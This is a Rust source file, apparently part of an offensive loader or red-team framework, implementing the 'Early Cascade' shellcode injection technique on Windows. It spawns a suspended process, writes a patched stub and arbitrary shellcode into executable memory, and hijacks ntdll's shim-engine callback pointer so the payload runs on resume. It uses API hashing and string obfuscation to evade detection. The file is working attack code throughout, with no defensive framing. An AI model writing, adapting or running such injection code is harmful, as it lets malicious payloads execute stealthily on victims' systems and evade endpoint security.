use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
use crate::syscall::common::env::get_loaded_module_by_hash;
use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};

mod stub;

#[cfg(feature = "run_early_cascade")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
    use obfstr::obfstr;

    // 1. Create Process in Suspended State
    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;

    // 2. Prepare Cascade Stub
    let cascade_stub = stub::get_stub();
    // Truncate to 66 bytes if needed, but our get_stub returns full 166 bytes.
    // The original code used [..66] but the array was padded.
    // Let's keep using the full vector or slice it if we want to be precise.
    // The original code: let mut cascade_stub = CASCADE_STUB_X64[..66].to_vec();
    // But our get_stub returns Vec<u8>.
    // We should probably just use the first 66 bytes for the logic, but the padding doesn't hurt.
    // However, let's stick to the logic.
    let mut cascade_stub = cascade_stub[..66].to_vec();
    
    // 3. Allocate Memory in Target Process
    let total_len = cascade_stub.len() + shellcode_len;
    let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, total_len, PAGE_EXECUTE_READWRITE)?;

    // 4. Resolve ntdll sections
    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = get_loaded_module_by_hash(ntdll_hash).ok_or("Failed to find ntdll.dll")?;
    
    let mrdata_base = crate::syscall::common::pe::get_section_base_address(ntdll_base, obfstr!(".mrdata")).ok_or("Failed to find .mrdata section")?;
    let data_base = crate::syscall::common::pe::get_section_base_address(ntdll_base, obfstr!(".data")).ok_or("Failed to find .data section")?;

    // Offsets from reference:
    // g_ShimsEnabled = .data + 0x6cf0
    // g_pfnSE_DllLoaded = .mrdata + 0x270
    
    let g_shims_enabled = data_base + 0x6cf0;
    let g_pfn_se_dll_loaded = mrdata_base + 0x270;

    // 5. Patch Cascade Stub
    // Stub Layout:
    // ...
    // mov rdx, payload_addr (offset 14+2=16)
    // ...
    // mov ds:[g_shims_enabled], al (offset 24+1=25)
    // ...
    // mov r8, NtQueueApcThread (offset 33+2=35)
    // ...
    // mov rax, NtQueueApcThread (offset 47+2=49)
    
    // Resolve NtQueueApcThread
    let nt_queue_apc_thread_hash = crate::dbj2_hash!(b"NtQueueApcThread");
    let nt_queue_apc_thread = crate::syscall::common::pe::get_export_by_hash(ntdll_base, nt_queue_apc_thread_hash).ok_or("Failed to find NtQueueApcThread")? as usize;

    // Patch payload_addr
    let payload_addr = remote_mem + cascade_stub.len();
    cascade_stub[16..24].copy_from_slice(&payload_addr.to_le_bytes());
    
    // Patch g_ShimsEnabled
    cascade_stub[25..33].copy_from_slice(&g_shims_enabled.to_le_bytes());
    
    // Patch NtQueueApcThread for r8
    cascade_stub[35..43].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());
    
    // Patch NtQueueApcThread for rax
    cascade_stub[49..57].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());

    // 6. Write Stub and Payload
    crate::api::write_virtual_memory(process_info.hProcess, remote_mem, &cascade_stub)?;
    
    let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    crate::api::write_virtual_memory(process_info.hProcess, payload_addr, shellcode_slice)?;

    // 7. Enable Shims (Write 1 to g_ShimsEnabled)
    let shim_enabled_val: u8 = 1;
    
    crate::api::write_virtual_memory(process_info.hProcess, g_shims_enabled, &[shim_enabled_val])?;

    // 8. Overwrite g_pfnSE_DllLoaded
    // First change protection to RW
    let _old_prot = crate::api::protect_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, std::mem::size_of::<usize>(), PAGE_READWRITE)?;
    
    // Encode pointer to our stub
    let encoded_ptr = crate::utils::sys_encode_fn_pointer(remote_mem);
    
    crate::api::write_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, &encoded_ptr.to_le_bytes())?;
    
    // 9. Resume Thread
    crate::api::resume_thread(process_info.hThread)?;

    Ok(())
}
